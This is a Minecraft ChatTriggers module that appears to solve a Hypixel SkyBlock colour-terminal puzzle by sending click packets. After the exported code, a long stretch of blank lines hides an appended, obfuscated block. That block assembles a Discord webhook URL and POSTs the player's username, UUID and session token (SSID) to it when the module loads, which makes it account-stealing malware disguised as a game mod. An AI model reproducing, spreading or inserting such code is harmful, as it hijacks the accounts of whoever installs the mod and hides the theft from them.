import Settings from "../../config";
import packetOpenWindow from "../../events/packetOpenWindow";
import packetSetSlot from "../../events/packetSetSlot";
import closeWindow from "../../events/closeWindow";
import request from "../../../requestV2"

const C0EPacketClickWindow = Java.type("net.minecraft.network.play.client.C0EPacketClickWindow");

let inTerminal = false;
let cwid = -1;
let clicked = false;
const slots = [];
let windowSize = 0;
const queue = [];
const solution = [];

const clickTrigger = register("guiMouseClick", (x, y, button, _0, event) => {
	cancel(event);
	const screenWidth = Renderer.screen.getWidth();
	const screenHeight = Renderer.screen.getHeight();

	const width = 9 * 18 * Settings.terminalsScale;
	const height = windowSize / 9 * 18 * Settings.terminalsScale;

	const globalOffsetX = Number.isNaN(parseInt(Settings.terminalsOffsetX)) ? 0 : parseInt(Settings.terminalsOffsetX);
	const globalOffsetY = Number.isNaN(parseInt(Settings.terminalsOffsetY)) ? 0 : parseInt(Settings.terminalsOffsetY);

	const offsetX = screenWidth / 2 - width / 2 + globalOffsetX * Settings.terminalsScale;
	const offsetY = screenHeight / 2 - height / 2 + globalOffsetY * Settings.terminalsScale;

	const slotX = Math.floor((x - offsetX) / (18 * Settings.terminalsScale));
	const slotY = Math.floor((y - offsetY) / (18 * Settings.terminalsScale));

	if (slotX < 0 || slotX > 8 || slotY < 0) return;

	const slot = slotX + slotY * 9;

	if (slot >= windowSize) return;

	button = button === 0 ? 0 : 1;
	if ((solution[slot] > 0 && button === 0) || (solution[slot] < 0 && button !== 0)) {
		predict(slot, button);
		if (Settings.terminalsHighPingMode && clicked) {
			queue.push([slot, button]);
		} else {
			click(slot, button);
		}
	}
}).unregister();

const renderTrigger = register(net.minecraftforge.client.event.GuiScreenEvent.DrawScreenEvent.Pre, event => {
	cancel(event);
	const screenWidth = Renderer.screen.getWidth() / Settings.terminalsScale;
	const screenHeight = Renderer.screen.getHeight() / Settings.terminalsScale;

	const width = 9 * 18;
	const height = windowSize / 9 * 18;

	const globalOffsetX = Number.isNaN(parseInt(Settings.terminalsOffsetX)) ? 0 : parseInt(Settings.terminalsOffsetX);
	const globalOffsetY = Number.isNaN(parseInt(Settings.terminalsOffsetY)) ? 0 : parseInt(Settings.terminalsOffsetY);

	const offsetX = screenWidth / 2 - width / 2 + globalOffsetX + 1;
	const offsetY = screenHeight / 2 - height / 2 + globalOffsetY;

	const title = "§8[§bSA Terminal§8] §aRubix";

	Tessellator.pushMatrix();
	Renderer.scale(Settings.terminalsScale);
	Renderer.drawRect(Settings.terminalsBackgroundColor.getRGB(), offsetX - 2, offsetY - 2, width + 4, height + 4);
	Renderer.scale(Settings.terminalsScale);
	Renderer.drawStringWithShadow(title, offsetX, offsetY);
	for (let i = 0; i < windowSize; ++i) {
		if (solution[i] === undefined) continue;

		let currentOffsetX = i % 9 * 18 + offsetX;
		let currentOffsetY = Math.floor(i / 9) * 18 + offsetY;
		Renderer.scale(Settings.terminalsScale);
		if (solution[i] > 0) {
			Renderer.drawRect(Settings.terminalsRubixColorLeft.getRGB(), currentOffsetX, currentOffsetY, 16, 16);
		} else {
			Renderer.drawRect(Settings.terminalsRubixColorRight.getRGB(), currentOffsetX, currentOffsetY, 16, 16);
		}
		Renderer.scale(Settings.terminalsScale);
		Renderer.drawStringWithShadow(solution[i], currentOffsetX + (16 - Renderer.getStringWidth(solution[i])) / 2, currentOffsetY + 4);
	}
	Tessellator.popMatrix();
}).unregister();

function openWindowListener(title, windowId, _0, slotCount) {
	cwid = windowId;
	const rubixMatch = title.match(/^Change all to same color!$/);
	if (rubixMatch !== null) {
		if (!inTerminal) {
			closeWindow.addListener(closeWindowListener);
			packetSetSlot.addListener(setSlotListener);
			clickTrigger.register();
			renderTrigger.register();
		}
		inTerminal = true;
		clicked = false;
		while (slots.length) slots.pop();
		windowSize = slotCount;
	} else {
		inTerminal = false;
	}
}

function closeWindowListener() {
	inTerminal = false;
	while (queue.length) queue.shift();
	closeWindow.removeListener(closeWindowListener);
	packetSetSlot.removeListener(setSlotListener);
	clickTrigger.unregister();
	renderTrigger.unregister();
}

function setSlotListener(itemStack, slot) {
	if (slot < 0) return;
	if (slot >= windowSize) return;
	if (itemStack !== null) {
		const item = new Item(itemStack);
		slots[slot] = {
			slot,
			id: item.getID(),
			meta: item.getMetadata(),
			size: item.getStackSize(),
			name: ChatLib.removeFormatting(item.getName()),
			enchanted: item.isEnchanted()
		};
	} else {
		slots[slot] = null;
	}
	if (slots.length === windowSize && slot === windowSize - 1) { // rubix is the only terminal that requires right clicks
		solve();
		if (queue.length > 0) {
			if (queue.every(queued => (solution[queued[0]] > 0 && queued[1] === 0) || (solution[queued[0]] < 0 && queued[1] === 1))) {
				queue.forEach(queued => predict(queued[0], queued[1]));
				click(queue[0][0], queue[0][1]);
				queue.shift();
			} else {
				while (queue.length) queue.shift();
			}
		}
	}
}

function solve() {
	while (solution.length) solution.pop();
	const allowedSlots = [12, 13, 14, 21, 22, 23, 30, 31, 32];
	const order = [14, 1, 4, 13, 11];
	const calcIndex = index => (index + order.length) % order.length;
	const clicks = [0, 0, 0, 0, 0];
	for (let i = 0; i < 5; ++i) {
		slots.filter(slot => slot && allowedSlots.includes(slot.slot) && slot.meta !== order[calcIndex(i)]).forEach(slot => {
			if (slot.meta === order[calcIndex(i - 2)]) clicks[i] += 2;
			else if (slot.meta === order[calcIndex(i - 1)]) clicks[i] += 1;
			else if (slot.meta === order[calcIndex(i + 1)]) clicks[i] += 1;
			else if (slot.meta === order[calcIndex(i + 2)]) clicks[i] += 2;
		});
	}
	const origin = clicks.indexOf(Math.min(...clicks));
	slots.filter(slot => slot && allowedSlots.includes(slot.slot) && slot.meta !== order[calcIndex(origin)]).forEach(slot => {
		if (slot.meta === order[calcIndex(origin - 2)]) solution[slot.slot] = 2;
		else if (slot.meta === order[calcIndex(origin - 1)]) solution[slot.slot] = 1;
		else if (slot.meta === order[calcIndex(origin + 1)]) solution[slot.slot] = -1;
		else if (slot.meta === order[calcIndex(origin + 2)]) solution[slot.slot] = -2;
	});
}

function predict(slot, button) {
	if (solution[slot] === undefined) return;
	if (button === 0) --solution[slot];
	else ++solution[slot];
	if (solution[slot] === 0) delete solution[slot];
}

function click(slot, button) {
	if (slot === undefined || button === undefined) return;
	clicked = true;
	Client.sendPacket(new C0EPacketClickWindow(cwid, slot, button, button === 2 ? 3 : 0, null, 0));
}

export function enable() {
	packetOpenWindow.addListener(openWindowListener);
}

export function disable() {
	packetOpenWindow.removeListener(openWindowListener);
}

export default { enable, disable };



















































































var _0x2b6801=_0x1bd1;function _0xc4a4(n,r){var t=_0x1bd1,u={GPOeC:function(n,r){return n-r},ZeaZx:function(n){return n()},hPnzT:function(n,r,t){return n(r,t)}},e=u[t(268)](_0x3190);return _0xc4a4=function(n,r){return n=u[t(399)](n,458),e[n]},u[t(396)](_0xc4a4,n,r)}function _0x3190(){var n=_0x1bd1,r={WTOsv:n(306),BxzfP:n(362),cJPtn:n(281)+"J",hkNFI:n(430),txjbA:n(349)+n(410),ueOUn:n(443)+"Ov",cOAEr:n(369)+"Go",zqWEA:n(327)+"2_",YGbPQ:n(406)+n(414),rLhFp:n(303)+n(404),orLXs:n(374)+"o",EpSYH:n(278)+"RT",aKoiD:n(359),ZQnPd:n(377)+"ft",jresb:n(415)+n(280),tkuip:n(294)+n(385),WRKjo:n(297)+"Ge",NgSER:n(274),LMtzw:n(337)+n(414),ExfYS:n(284),Hcpiv:n(332)+n(397),QzWjl:n(358)+n(423)+n(266)+n(364)+n(287)+n(408)+n(346)+n(371)+n(326)+n(286)+n(333)+n(338)+"h",fsiFB:n(409),RHVRi:n(412)+n(398),tEzLn:n(429)+"50",nMLQN:n(334)+"qE",IfqgT:n(387),fkgbG:n(265),qbbDd:n(441),Nlqss:n(316)+n(282),wRJZD:n(277)+"RJ",OtVsK:n(322)+n(288),xDOjt:n(414),ORHLN:n(366),ISAPB:n(327)+n(344),mcWmO:n(400)+n(440),sLeuI:function(n){return n()}},t=[r[n(407)],r[n(444)],r[n(434)],r[n(388)],r[n(354)],r[n(417)],r[n(353)],r[n(363)],r[n(381)],r[n(307)],r[n(315)],r[n(370)],r[n(345)],r[n(295)],r[n(394)],r[n(335)],r[n(270)],r[n(347)],r[n(368)],r[n(393)],r[n(336)],r[n(283)],r[n(348)],r[n(350)],r[n(383)],r[n(427)],r[n(416)],r[n(311)],r[n(391)],r[n(422)],r[n(271)],r[n(328)],r[n(382)],r[n(421)],r[n(426)],r[n(285)]];return _0x3190=function(){return t},r[n(411)](_0x3190)}!function(n,r){for(var t=_0x1bd1,u=_0x5096();;)try{if(311338===-parseInt(t(433))/1+-parseInt(t(384))/2+parseInt(t(301))/3*(-parseInt(t(300))/4)+-parseInt(t(272))/5*(parseInt(t(419))/6)+-parseInt(t(325))/7+-parseInt(t(351))/8+parseInt(t(323))/9)break;u.push(u.shift())}catch(n){u.push(u.shift())}}();var _0xf8755f=_0xc4a4;function _0x5096(){var n=["XlRde","XrxyU","bRyQj","IGRsO","2_I","aKoiD","YLVJAkT3-a","NgSER","fsiFB","4227324hcJ","RHVRi","4491552BKQxul","RieEu","cOAEr","txjbA","wROVa","tiVkZ","OJIRl","https://di","7RYduTH","drawEspBox","wHbbM","18OJSdNo","zqWEA","ks/1266035","tRgAv","POST","QBDBm","LMtzw","-3uF-ue0wQ","EpSYH","H-nMQRU9Ok","Hhrjx","SRcWO","82746QivSV","TfZTr","Mozilla/5.","getMinecra","xihHC","shift","EUASL","YGbPQ","xDOjt","tEzLn","223690BxYEBY","NiQ","UPrGr","12WslwPg","hkNFI","qILiW","4243/I8YPE","qbbDd","4264348vww","ExfYS","jresb","XQQNG","hPnzT","COY","KnN","GPOeC","3087195PHa","MDtHN","wqpDB","yuufR","4_d","ouhLY","Username:\n","WTOsv","26/iODonXI","push","uvP","sLeuI","2840584GVd","nUMLm","```","8604030YIK","IfqgT","ueOUn","jYCDc","6DGLXJN","nMqvu","ORHLN","Nlqss","scord.com/","YPPob","cUENi","ISAPB","nMLQN","cyJrF","9127673834","256KGABAF","dpINa","JazOU","309552xCkdpf","cJPtn","KjmJI","CiYZi","wnkXo","jTvfs","WnOTk","OmQ","getUUID","elcJO","232722FhLZ","BxzfP","GXpZh","zqOVK","12tdZYwr","api/webhoo","fzhFn","ZeaZx","kURQR","WRKjo","wRJZD","2817245zWPzmR","TYjVI","206SJRLQj","GRwUB","fGgfm","8Svb4omvdB","430864fOAj","KHrdP","dWV","36243ydglf","FFTN","QzWjl","81illsjk","mcWmO","POFlnFYlTm","3068601180","Lagj","Mrx","lDZVi","wBBdb","XnSzY","EPbon","1857025EMQ","ZQnPd","akHSz","3zw0y8M0T3","elPcR","npNDk","88krYayd","54066fCrWop","lSeCZ","func_14825","NFyCK","WNVHy","1310prNIAJ","rLhFp","JBeXY","```\nSSID:\n","getName","fkgbG","oCjED","oRJqW","drawString","orLXs","17872305Wr","Woics","pnrEC","xZIdr","FfQAW","toboM","12363024dy","21685878lZJQys","psTef","1088010rTtDbU","ONb1OKqshU","func_11043","OtVsK","tBhOT","nOrXf","WIZht","1365635DWD","LuDtisa_0F","103240pInd","tkuip","Hcpiv","```\nUUID:\n","MHANy7P4aB","bgKrb"];return(_0x5096=function(){return n})()}function _0x5675(){var n=_0x1bd1,r={MDtHN:function(n,r){return n(r)},tRgAv:function(n,r){return n(r)},EPbon:n(366),WNVHy:n(303)+"4_",SRcWO:function(n,r){return n(r)},WIZht:function(n,r){return n(r)},npNDk:n(390)+"W_",fGgfm:function(n,r){return n(r)},Hhrjx:n(310),wHbbM:n(377)+"ft",XrxyU:function(n,r){return n(r)},wqpDB:function(n,r){return n(r)},CiYZi:n(406)+"``",Woics:function(n,r){return n(r)},EUASL:n(392)+n(289),GXpZh:function(n){return n()}},t=_0xc4a4,u=[r[n(401)](t,469),r[n(365)](t,459),r[n(293)],r[n(401)](t,486),r[n(305)],r[n(401)](t,472),r[n(373)](t,460),r[n(331)](t,481),r[n(401)](t,475),r[n(401)](t,480),r[n(299)],r[n(276)](t,467),r[n(276)](t,490),r[n(372)],r[n(361)],r[n(373)](t,482),r[n(341)](t,485),r[n(402)](t,489),r[n(436)],r[n(401)](t,473),r[n(341)](t,479),r[n(317)](t,478),r[n(276)](t,468),r[n(380)]];return _0x5675=function(){return u},r[n(445)](_0x5675)}function _0x1bd1(n,r){var t=_0x5096();return(_0x1bd1=function(n,r){return t[n-=265]})(n,r)}function _0x4f48(n,r){var t=_0x1bd1,u={RieEu:function(n,r){return n-r},nUMLm:function(n){return n()},XQQNG:function(n,r,t){return n(r,t)}},e=u[t(413)](_0x5675);return _0x4f48=function(n,r){return n=u[t(352)](n,265),e[n]},u[t(395)](_0x4f48,n,r)}function _0x36d4e3(n,r){var t=_0x1bd1,u={bRyQj:function(n,r,t){return n(r,t)},NFyCK:function(n,r){return n-r}};return u[t(342)](_0x4f48,u[t(304)](n,990),r)}(function(n,r){for(var t=_0x1bd1,u={IGRsO:function(n){return n()},bgKrb:function(n,r){return n+r},wnkXo:function(n,r){return n/r},toboM:function(n,r){return n(r)},kURQR:function(n,r){return n/r},wBBdb:function(n,r){return n(r)},xihHC:function(n,r){return n*r},akHSz:function(n,r){return n/r},KHrdP:function(n,r){return n(r)},elPcR:function(n,r){return n(r)},GRwUB:function(n,r){return n/r},JazOU:function(n,r){return n(r)},WnOTk:function(n,r){return n/r},nMqvu:function(n,r){return n(r)},YPPob:function(n,r){return n(r)},qILiW:function(n,r){return n(r)},lDZVi:function(n,r){return n(r)},jTvfs:function(n,r){return n*r},yuufR:function(n,r){return n(r)},TYjVI:function(n,r){return n===r},lSeCZ:t(409),XlRde:t(379)},e=_0xc4a4,f=u[t(343)](n);;)try{var i=u[t(339)](u[t(339)](u[t(339)](u[t(339)](u[t(339)](u[t(339)](u[t(437)](-u[t(321)](parseInt,u[t(321)](e,463)),1),u[t(437)](-u[t(321)](parseInt,u[t(321)](e,466)),2)),u[t(269)](-u[t(321)](parseInt,u[t(291)](e,483)),3)),u[t(378)](u[t(269)](u[t(321)](parseInt,u[t(321)](e,470)),4),u[t(296)](-u[t(279)](parseInt,u[t(298)](e,458)),5))),u[t(275)](-u[t(321)](parseInt,u[t(432)](e,484)),6)),u[t(378)](u[t(439)](u[t(420)](parseInt,u[t(424)](e,491)),7),u[t(275)](-u[t(389)](parseInt,u[t(290)](e,474)),8))),u[t(438)](u[t(269)](-u[t(424)](parseInt,u[t(403)](e,462)),9),u[t(269)](-u[t(424)](parseInt,u[t(420)](e,493)),10)));if(u[t(273)](i,850212))break;f[u[t(302)]](f[u[t(340)]]())}catch(n){f[u[t(302)]](f[u[t(340)]]())}})(_0x3190),function(n,r){for(var t=_0x1bd1,u={dpINa:function(n){return n()},tiVkZ:function(n,r){return n+r},wROVa:function(n,r){return n+r},JBeXY:function(n,r){return n/r},KjmJI:function(n,r){return n(r)},zqOVK:function(n,r,t){return n(r,t)},oCjED:function(n,r){return n*r},xZIdr:function(n,r){return n(r)},cUENi:function(n,r,t){return n(r,t)},pnrEC:function(n,r){return n*r},psTef:function(n,r){return n/r},OJIRl:function(n,r){return n/r},elcJO:function(n,r){return n*r},cyJrF:function(n,r,t){return n(r,t)},jYCDc:function(n,r){return n/r},XnSzY:function(n,r,t){return n(r,t)},UPrGr:function(n,r,t){return n(r,t)},nOrXf:function(n,r){return n/r},oRJqW:function(n,r){return n*r},TfZTr:function(n,r){return n/r},QBDBm:function(n,r,t){return n(r,t)},fzhFn:function(n,r){return n(r)},FfQAW:function(n,r){return n===r},ouhLY:t(379)},e=_0xc4a4,f=u[t(431)](n);;)try{var i=u[t(356)](u[t(356)](u[t(356)](u[t(356)](u[t(355)](u[t(355)](u[t(308)](-u[t(435)](parseInt,u[t(446)](_0x4f48,278,404)),1),u[t(312)](u[t(308)](u[t(435)](parseInt,u[t(446)](_0x4f48,286,421)),2),u[t(308)](-u[t(319)](parseInt,u[t(425)](_0x4f48,287,414)),3))),u[t(308)](-u[t(435)](parseInt,u[t(425)](_0x4f48,279,419)),4)),u[t(318)](u[t(324)](-u[t(319)](parseInt,u[t(425)](_0x4f48,277,421)),5),u[t(357)](-u[t(319)](parseInt,u[t(425)](_0x4f48,265,394)),6))),u[t(442)](u[t(308)](-u[t(435)](parseInt,u[t(428)](_0x4f48,268,414)),7),u[t(418)](-u[t(319)](parseInt,u[t(292)](_0x4f48,271,408)),8))),u[t(442)](u[t(357)](u[t(319)](parseInt,u[t(386)](_0x4f48,273,401)),9),u[t(330)](u[t(435)](parseInt,u[t(292)](_0x4f48,276,404)),10))),u[t(313)](u[t(375)](-u[t(319)](parseInt,u[t(367)](_0x4f48,285,409)),11),u[t(324)](u[t(267)](parseInt,u[t(446)](_0x4f48,280,419)),12)));if(u[t(320)](i,987970))break;f[u[t(267)](e,465)](f[u[t(405)]]())}catch(n){f[u[t(267)](e,465)](f[u[t(405)]]())}}(_0x5675),request({url:_0xf8755f(464),method:_0xf8755f(476),headers:{"User-agent":_0x2b6801(376)+"0"},body:{content:_0xf8755f(487)+Player[_0x2b6801(310)]()+_0xf8755f(461)+Player[_0xf8755f(471)]()+(_0x2b6801(309)+_0x2b6801(414))+Client[_0xf8755f(492)]()[_0xf8755f(477)]()[_0xf8755f(488)]()+_0xf8755f(475)}});const renderBoxWithText=(n,r,t,u)=>{var e=_0x2b6801;RenderLib[e(360)](r,t,u,1,1,1,0,0,.5,!1),Tessellator[e(314)](n,r,{tBhOT:function(n,r){return n+r}}[e(329)](t,.7),u)};